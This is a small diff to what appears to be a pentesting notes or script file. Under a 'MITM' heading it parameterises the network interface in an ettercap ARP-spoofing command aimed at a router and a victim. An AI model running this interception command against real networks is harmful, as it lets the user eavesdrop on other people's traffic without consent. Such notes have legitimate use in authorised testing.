@@ -1,4 +1,4 @@
 #MITM:
-   sudo ettercap -T -S -i wlan0 -M arp:remote /router// /victim//
+   sudo ettercap -T -S -i {interface} -M arp:remote /router// /victim//
 
 
